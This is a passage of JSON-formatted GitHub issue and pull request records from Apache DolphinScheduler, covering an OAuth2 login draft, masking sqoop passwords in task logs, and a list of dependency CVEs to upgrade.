                        "body": "@songjianet @devosend @Amy0104 Currently we have some logic in front-end `handleLogin` like calling `getUserInfo()`. Once we support `OAuth2` login, user will no more get redirected to Username / Password login page, this `handlLogin` will not get triggered and that causes some issues, such as users cannot create projects. May I ask whether there are solutions to this? \r\n\r\n![image](https://user-images.githubusercontent.com/34905992/199916898-f26594f6-798d-469c-a2bb-b7a58b0425b0.png)\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/7d0e2cbbb9fcd2e1543f5166f0518eda03afae89/dolphinscheduler-ui/src/views/login/use-login.ts#L35-L44",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-04T07:28:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1303068538"
                    },
                    {
                        "body": "> @songjianet @devosend @Amy0104 Currently we have some logic in front-end `handleLogin` like calling `getUserInfo()`. Once we support `OAuth2` login, user will no more get redirected to Username / Password login page, this `handlLogin` will not get triggered and that causes some issues, such as users cannot create projects. May I ask whether there are solutions to this?\r\n> \r\n> ![image](https://user-images.githubusercontent.com/34905992/199916898-f26594f6-798d-469c-a2bb-b7a58b0425b0.png)\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/7d0e2cbbb9fcd2e1543f5166f0518eda03afae89/dolphinscheduler-ui/src/views/login/use-login.ts#L35-L44\r\n\r\n\r\n\r\n> @songjianet @devosend @Amy0104 Currently we have some logic in front-end `handleLogin` like calling `getUserInfo()`. Once we support `OAuth2` login, user will no more get redirected to Username / Password login page, this `handlLogin` will not get triggered and that causes some issues, such as users cannot create projects. May I ask whether there are solutions to this?\r\n> \r\n> ![image](https://user-images.githubusercontent.com/34905992/199916898-f26594f6-798d-469c-a2bb-b7a58b0425b0.png)\r\n> \r\n> https://github.com/apache/dolphinscheduler/blob/7d0e2cbbb9fcd2e1543f5166f0518eda03afae89/dolphinscheduler-ui/src/views/login/use-login.ts#L35-L44\r\n\r\nYou can add a new blank page on the front end to call `getUserInfo`.",
                        "user": "devosend",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-08T02:54:44Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1306551902"
                    },
                    {
                        "body": "@Abingcbc Since the credentials differentiate a lot from LDAP / PASSWORD when integrated with OAuth2.0, we may abstract `AbstractLoginCredentials` to keep things unified like the way in this draft PR. WDYT?",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-30T07:31:05Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1331746749"
                    },
                    {
                        "body": "Considering @Abingcbc has been working on integrating DS with `OAuth2.0` since March 5th, I think a better choice is to follow up with #8706 and help it get merged. Therefore, I'm closing this PR temporarily. If there are more things to do after #8706 merged, I will reopen this PR. Thanks : )",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-30T07:36:13Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/12549#issuecomment-1331750701"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/dolphinscheduler/pulls/12549",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/pull/11589",
                "title": "[Feature-10498] Mask the password in the log of sqoop task",
                "labels": [
                    "improvement",
                    "backend",
                    "document",
                    "security",
                    "3.2.0"
                ],
                "user": "rickchengx",
                "issue_author_association": "CONTRIBUTOR",
                "number": 11589,
                "id": 1345948356,
                "state": "closed",
                "project_created_at": "2022-08-22T07:28:36Z",
                "closed_at": "2022-11-24T06:54:54Z",
                "body": "<!--Thanks very much for contributing to Apache DolphinScheduler. Please review https://dolphinscheduler.apache.org/en-us/community/development/pull-request.html before opening a pull request.-->\r\n\r\n\r\n## Purpose of the pull request\r\n\r\nMask the password in the log of `sqoop` task.\r\n\r\nCurrently, there are 2 positions that the log of `sqoop` task will output the password of mysql:\r\nhttps://github.com/apache/dolphinscheduler/blob/17a9dd25fa0e80b048394f79db130f56eb8ef72f/dolphinscheduler-task-plugin/dolphinscheduler-task-sqoop/src/main/java/org/apache/dolphinscheduler/plugin/task/sqoop/SqoopTask.java#L83\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/17a9dd25fa0e80b048394f79db130f56eb8ef72f/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/ShellCommandExecutor.java#L116\r\n\r\n\r\n## Brief change log\r\n\r\n<!--*(for example:)*\r\n  - *Add maven-checkstyle-plugin to root pom.xml*\r\n-->\r\n## Verify this pull request\r\n\r\n<!--*(Please pick either of the following options)*-->\r\n\r\nManually tested.\r\n\r\n<img width=\"1122\" alt=\"截屏2022-08-22 15 30 38\" src=\"https://user-images.githubusercontent.com/38122586/185864886-c8e827dd-d7e0-461b-9565-59c7bcbc8dcf.png\">\r\n",
                "comments": [
                    {
                        "body": "related: #10498",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-22T08:29:48Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1222025724"
                    },
                    {
                        "body": "This is a good feature. Could you please add a UT for it? Thanks.",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-24T11:24:22Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1225587341"
                    },
                    {
                        "body": "> This is a good feature. Could you please add a UT for it? Thanks.\r\n\r\nHi, @EricGao888, Sorry for the late response. I've added a UT.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-08-31T10:16:19Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1232746946"
                    },
                    {
                        "body": "# [Codecov](https://codecov.io/gh/apache/dolphinscheduler/pull/11589?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) Report\n> Merging [#11589](https://codecov.io/gh/apache/dolphinscheduler/pull/11589?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (6708c75) into [dev](https://codecov.io/gh/apache/dolphinscheduler/commit/64a29c61e47442dbca84ee4bfca9815fd546a26f?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) (64a29c6) will **increase** coverage by `0.00%`.\n> The diff coverage is `44.44%`.\n\n```diff\n@@            Coverage Diff            @@\n##                dev   #11589   +/-   ##\n=========================================\n  Coverage     39.35%   39.36%           \n  Complexity     4270     4270           \n=========================================\n  Files          1067     1067           \n  Lines         40118    40121    +3     \n  Branches       4606     4605    -1     \n=========================================\n+ Hits          15790    15794    +4     \n+ Misses        22552    22547    -5     \n- Partials       1776     1780    +4     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/dolphinscheduler/pull/11589?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation) | Coverage Δ | |\n|---|---|---|\n| [.../dolphinscheduler/plugin/task/sqoop/SqoopTask.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci10YXNrLXBsdWdpbi9kb2xwaGluc2NoZWR1bGVyLXRhc2stc3Fvb3Avc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL3Rhc2svc3Fvb3AvU3Fvb3BUYXNrLmphdmE=) | `0.00% <0.00%> (ø)` | |\n| [...inscheduler/common/log/SensitiveDataConverter.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1jb21tb24vc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvY29tbW9uL2xvZy9TZW5zaXRpdmVEYXRhQ29udmVydGVyLmphdmE=) | `63.15% <50.00%> (ø)` | |\n| [...erver/master/processor/queue/TaskEventService.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1tYXN0ZXIvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvc2VydmVyL21hc3Rlci9wcm9jZXNzb3IvcXVldWUvVGFza0V2ZW50U2VydmljZS5qYXZh) | `69.64% <0.00%> (-10.72%)` | :arrow_down: |\n| [...dolphinscheduler/remote/future/ResponseFuture.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1yZW1vdGUvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcmVtb3RlL2Z1dHVyZS9SZXNwb25zZUZ1dHVyZS5qYXZh) | `81.96% <0.00%> (-1.64%)` | :arrow_down: |\n| [...r/plugin/registry/zookeeper/ZookeeperRegistry.java](https://codecov.io/gh/apache/dolphinscheduler/pull/11589/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation#diff-ZG9scGhpbnNjaGVkdWxlci1yZWdpc3RyeS9kb2xwaGluc2NoZWR1bGVyLXJlZ2lzdHJ5LXBsdWdpbnMvZG9scGhpbnNjaGVkdWxlci1yZWdpc3RyeS16b29rZWVwZXIvc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL2RvbHBoaW5zY2hlZHVsZXIvcGx1Z2luL3JlZ2lzdHJ5L3pvb2tlZXBlci9ab29rZWVwZXJSZWdpc3RyeS5qYXZh) | `50.00% <0.00%> (+6.45%)` | :arrow_up: |\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=The+Apache+Software+Foundation)\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-09-01T02:39:25Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1233666175"
                    },
                    {
                        "body": "> May I ask whether we could do this with some other ways in `sqoop task plugin` instead of add a specific condition here for `sqoop`? ShellCommandExecutor is shared across different task plugins, it might not be a good practice and uneasy to maintain if we need to change it every time we need to mask something for a task plugin. The same for line 55-56.\r\n\r\nHi, @EricGao888. Thanks for your suggestions. I have moved the masking logic to a common util class.\r\n\r\n### Background\r\n\r\nThere are 2 possible locations that the log may contain the sensitive data (e.g., password). Taking the sqoop task as an example:\r\n\r\n1. The log output in the `buildCommand()` in `SqoopTask`. \r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/28469fc9b23094a74cbef83b9990d6fbced20d79/dolphinscheduler-task-plugin/dolphinscheduler-task-sqoop/src/main/java/org/apache/dolphinscheduler/plugin/task/sqoop/SqoopTask.java#L82-L84\r\n\r\n2. The log output in the `createCommandFileIfNotExists(String execCommand, String commandFile)` in `ShellCommandExecutor`. We need to mask the sensitive data of `execCommand` here since the `execCommand` will be output in the log. But this class is shared by multiple task plugins and how to mask the sensitive data needs to be discussed.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/17a9dd25fa0e80b048394f79db130f56eb8ef72f/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/ShellCommandExecutor.java#L115-L116\r\n\r\n\r\n\r\nAs for me, there are 2 ways:\r\n\r\n### **1. Mask the sensitive data at the point of outputting the task log and every task plugin applys the same masking logic**\r\n\r\n* Encapsulate the `logger` of `AbstractTaskExecutor`. Every time the task log is output, the output statement will be matched to see if there is any sensitive data.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/ebcffb04aad9db8ec6df1105e4770b187088e701/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/AbstractTaskExecutor.java#L37\r\n\r\n* By default, common sensitive data will be matched, and users can customize the sensitive information that needs to be masked.\r\n\r\n<img width=\"619\" alt=\"image\" src=\"https://user-images.githubusercontent.com/38122586/188794873-0196158f-ebfc-4398-835a-f2ecca19cfef.png\">\r\n\r\n![image](https://user-images.githubusercontent.com/38122586/188795058-f19fb1fc-587d-404c-b7e3-c93ed7c14228.png)\r\n\r\nNote that the command after masking will only used to output in the log, so this method **will not affect the actual command executed.**\r\n\r\n\r\nReference: [Sensitive data masking of Airflow](https://airflow.apache.org/docs/apache-airflow/stable/security/secrets/mask-sensitive-values.html)\r\n\r\n\r\n\r\n### **2. Each task plugin implements its own masking logic**\r\n\r\nRefactor the `createCommandFileIfNotExists()` and add a param `String execCommandMasking`.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/28469fc9b23094a74cbef83b9990d6fbced20d79/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/ShellCommandExecutor.java#L84-L87\r\n\r\nAlso `AbstractCommandExecutor.run(execCommand)` needs to be refactored to `AbstractCommandExecutor.run(execCommand, execCommandMasking)`.\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/28469fc9b23094a74cbef83b9990d6fbced20d79/dolphinscheduler-task-plugin/dolphinscheduler-task-api/src/main/java/org/apache/dolphinscheduler/plugin/task/api/AbstractCommandExecutor.java#L176\r\n\r\nBy doing this, the process logic of how to mask the sensitive data can be done in each task plugin. But this will modify `AbstractCommandExecutor` and `ShellCommandExecutor`, and many task plugins need to be modified and implement their own masking logic.\r\n\r\nBelow is the list of affected classes:\r\n\r\n<img width=\"365\" alt=\"image\" src=\"https://user-images.githubusercontent.com/38122586/188796830-43a25252-f2b9-498d-9407-9712a9317ae6.png\">\r\n\r\n\r\n### Conclusion\r\nI personally prefer the first way to mask the sensitive data. And I also sent a related discussion email to the mailing list.\r\n\r\nSo which way do you think is better? Or there are other better ways to do so.\r\nAny comments or suggestions are welcome!\r\n",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-05T07:25:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1236633109"
                    },
                    {
                        "body": "We have use `SensitiveDataConverter` for the whole log to hide the password.",
                        "user": "ruanwenjun",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-09-07T12:44:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1239342287"
                    },
                    {
                        "body": "> We have use `SensitiveDataConverter` for the whole log to hide the password.\r\n\r\nThanks for your suggestion! I'll look into it.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-08T03:24:10Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1240170876"
                    },
                    {
                        "body": "> We have use `SensitiveDataConverter` for the whole log to hide the password.\r\n\r\nHi, @ruanwenjun , It seems that there is a bug in `SensitiveDataConverter` which will be fixed in #11459 \r\n\r\nAfter #11459 is fixed, maybe we can add a pattern in `SensitiveDataConverter` to mask the password in `sqoop` task.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-13T10:04:51Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1245186719"
                    },
                    {
                        "body": "Hi, @ruanwenjun , @EricGao888 , I've made changes to my PR as below:\r\n\r\n1. Use `SensitiveDataConverter` to uniformly mask sensitive information in task logs.\r\n2. Each task plugin can add its own regular match expressions to `SensitiveDataConverter` through `addMaskPattern()`. E.g., `Sqoop` task adds its own regular expression in `init()`:\r\n\r\n```\r\nSensitiveDataConverter.addMaskPattern(SqoopConstants.SQOOP_PASSWORD_REGEX);\r\n```\r\n\r\nThis PR solves the problem of the mysql password in the sqoop task log. If others find that other task types will output sensitive information in the log, they only need to add their own regular expression through `addMaskPattern()` in the `init()` of the task plugin.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-19T10:06:52Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1250820539"
                    },
                    {
                        "body": " \r\n> 1. Use `SensitiveDataConverter` to uniformly mask sensitive information in task logs.\r\n> 2. Each task plugin can add its own regular match expressions to `SensitiveDataConverter` through `addMaskPattern()`. E.g., `Sqoop` task adds its own regular expression in `init()`:\r\n> \r\n> ```\r\n> SensitiveDataConverter.addMaskPattern(SqoopConstants.SQOOP_PASSWORD_REGEX);\r\n> ```\r\n> \r\n> This PR solves the problem of the mysql password in the sqoop task log. If others find that other task types will output sensitive information in the log, they only need to add their own regular expression through `addMaskPattern()` in the `init()` of the task plugin.\r\n\r\nHi, @ruanwenjun , could you please help review this? I've rebased to remove conflicts.",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-10-13T07:45:32Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1277175211"
                    },
                    {
                        "body": "> Hi, @ruanwenjun , @EricGao888 , I've made changes to my PR as below:\r\n> \r\n> 1. Use `SensitiveDataConverter` to uniformly mask sensitive information in task logs.\r\n> 2. Each task plugin can add its own regular match expressions to `SensitiveDataConverter` through `addMaskPattern()`. E.g., `Sqoop` task adds its own regular expression in `init()`:\r\n> \r\n> ```\r\n> SensitiveDataConverter.addMaskPattern(SqoopConstants.SQOOP_PASSWORD_REGEX);\r\n> ```\r\n> \r\n> This PR solves the problem of the mysql password in the sqoop task log. If others find that other task types will output sensitive information in the log, they only need to add their own regular expression through `addMaskPattern()` in the `init()` of the task plugin.\r\n\r\nHi, @EricGao888 @caishunfeng , could you please help review this?",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-07T03:52:28Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1305044637"
                    },
                    {
                        "body": "SonarCloud Quality Gate failed.&nbsp; &nbsp; [![Quality Gate failed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/failed-16px.png 'Quality Gate failed')](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=11589)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=CODE_SMELL) [![D](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/D-16px.png 'D')](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=CODE_SMELL) [6 Code Smells](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=11589&resolved=false&types=CODE_SMELL)\n\n[![66.7%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/60-16px.png '66.7%')](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_coverage&view=list) [66.7% Coverage](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=11589&metric=new_duplicated_lines_density&view=list)\n\n",
                        "user": "sonarcloud[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-11-24T06:09:58Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1325998973"
                    },
                    {
                        "body": "Hi, @caishunfeng , I've moved `SensitiveDataConverter` to `dolphinscheduler-common` module.\r\n\r\ncc @zhongjiajie ",
                        "user": "rickchengx",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-24T06:13:07Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/11589#issuecomment-1326001477"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/dolphinscheduler/pulls/11589",
                    "merged_at": "2022-11-24T06:54:54Z"
                }
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/10427",
                "title": "[Bug] [deps] Upgrade package version to avoid exists CVE issue",
                "labels": [
                    "bug",
                    "dependencies",
                    "security"
                ],
                "user": "zhongjiajie",
                "issue_author_association": "MEMBER",
                "number": 10427,
                "id": 1268970430,
                "state": "closed",
                "project_created_at": "2022-06-13T06:32:13Z",
                "closed_at": "2022-09-11T11:17:35Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\nAfter #10058 merged, we have CI to check our dependencies CVE issue to avoid adding some packages that have CVE issues. But we have many existing problem packages we have to upgrade. This issue points them up and track them until all done and OWASP CI pass\n\n### What you expected to happen\n\nATT\n\n### How to reproduce\n\nATT\n\n### Anything else\n\nATT\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [X] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-06-13T06:33:25Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1153527441"
                    },
                    {
                        "body": "Currently package need to be upgrade is below\r\n\r\n```log\r\nError:  api-util-1.0.0-M20.jar: CVE-2018-1337(9.8)\r\nError:  avro-1.7.4.jar: CVE-2021-43045(7.5)\r\nError:  cron-utils-9.1.3.jar: CVE-2021-41269(9.8)\r\nError:  gson-2.8.8.jar: CVE-2022-25647(7.5)\r\nError:  h2-1.4.200.jar: CVE-2022-23221(9.8), CVE-2021-23463(9.1), CVE-2021-42392(9.8)\r\nError:  hadoop-yarn-server-common-2.7.3.jar: CVE-2017-15718(9.8), CVE-2022-26612(9.8), CVE-2020-9492(8.8), CVE-2018-8029(8.8), CVE-2016-6811(8.8), CVE-2018-8009(8.8), CVE-2018-11768(7.5), CVE-2018-1296(7.5), CVE-2017-3166(7.8)\r\nError:  hive-jdbc-2.1.0.jar: CVE-2018-11777(8.1), CVE-2020-13949(7.5), CVE-2018-1282(9.1)\r\nError:  hive-orc-2.1.0.jar: CVE-2018-11777(8.1), CVE-2020-13949(7.5), CVE-2018-1282(9.1)\r\nError:  hive-storage-api-2.1.0.jar: CVE-2018-11777(8.1), CVE-2018-1282(9.1)\r\nError:  htrace-core-3.1.0-incubating.jar/META-INF/maven/com.fasterxml.jackson.core/jackson-databind/pom.xml: CVE-2017-7525(9.8), CVE-2018-7489(9.8), CVE-2020-35491(8.1), CVE-2020-35490(8.1), CVE-2020-36518(7.5)\r\nError:  jackson-databind-2.10.5.jar: CVE-2020-25649(7.5), CVE-2020-36518(7.5)\r\nError:  jackson-mapper-asl-1.9.13.jar: CVE-2017-7525(9.8), CVE-2019-10172(7.5)\r\nError:  libfb303-0.9.3.jar: CVE-2016-5397(8.8), CVE-2018-1320(7.5), CVE-2019-0210(7.5), CVE-2020-13949(7.5), CVE-2019-0205(7.5)\r\nError:  libthrift-0.9.3.jar: CVE-2016-5397(8.8), CVE-2018-1320(7.5), CVE-2019-0210(7.5), CVE-2020-13949(7.5), CVE-2019-0205(7.5)\r\nError:  log4j-1.2-api-2.14.1.jar: CVE-2021-44228(10.0), CVE-2021-45046(9.0)\r\nError:  log4j-1.2.17.jar: CVE-2021-4104(7.5), CVE-2020-9493(9.8), CVE-2022-23307(8.8), CVE-2022-23305(9.8), CVE-2019-17571(9.8), CVE-2022-23302(8.8)\r\nError:  mybatis-3.5.2.jar: CVE-2020-26945(8.1)\r\nError:  mybatis-plus-3.2.0.jar: CVE-2020-26945(8.1), CVE-2022-25517(9.8)\r\nError:  mybatis-plus-core-3.2.0.jar: CVE-2020-26945(8.1)\r\nError:  netty-3.6.2.Final.jar: CVE-2019-16869(7.5), CVE-2015-2156(7.5), CVE-2021-37136(7.5), CVE-2021-37137(7.5), CVE-2019-20445(9.1), CVE-2019-20444(9.1)\r\nError:  netty-all-4.1.53.Final.jar: CVE-2021-37136(7.5), CVE-2021-37137(7.5)\r\nError:  okhttp-3.14.9.jar: CVE-2021-0341(7.5)\r\nError:  pom.xml: CVE-2018-11804(7.5), CVE-2018-17190(9.8)\r\nError:  pom.xml: CVE-2018-11804(7.5), CVE-2018-17190(9.8)\r\nError:  snappy-0.2.jar: CVE-2018-6353(7.8)\r\nError:  spring-core-5.3.12.jar: CVE-2022-22965(9.8), CVE-2016-1000027(9.8)\r\nError:  spring-plugin-core-1.2.0.RELEASE.jar: CVE-2022-22965(9.8), CVE-2016-1000027(9.8)\r\nError:  spring-tx-5.3.12.jar: CVE-2022-22965(9.8), CVE-2016-1000027(9.8)\r\nError:  swagger-bootstrap-ui-1.9.3.jar: axios.min.js: CVE-2019-10742(7.5), CVE-2021-3749(7.5)\r\nError:  unirest-java-3.7.04-standalone.jar/META-INF/maven/com.google.code.gson/gson/pom.xml: CVE-2022-25647(7.5)\r\nError:  xercesImpl-2.9.1.jar: CVE-2012-0881(7.5), CVE-2013-4002(7.1)\r\n```",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-06-13T06:34:48Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1153528407"
                    },
                    {
                        "body": "This issue has been automatically marked as stale because it has not had recent activity for 30 days. It will be closed in next 7 days if no further activity occurs.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-14T00:25:15Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1183809631"
                    },
                    {
                        "body": "remove stale",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-15T01:50:28Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1185087840"
                    },
                    {
                        "body": "Hi @zhongjiajie , I have working on this thing this time, I maybe can give some help",
                        "user": "qingwli",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-18T03:19:17Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1218999392"
                    },
                    {
                        "body": "> Hi @zhongjiajie , I have working on this thing this time, I maybe can give some help\r\n\r\nThanks for doing this, it is a good new for community",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-28T05:36:45Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/10427#issuecomment-1229381102"
                    },
                    {
                        "body": "Currently nearly all dependencies with CVEs are upgraded to latest, some of the reported dependencies don't yet have released new version that fixes the CVE, so we have no way to deal with those dependencies for now. Now this should be a routine work and let's close this issue",
                        "user": "kezhenxu94",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-09-11T11:17:35Z",
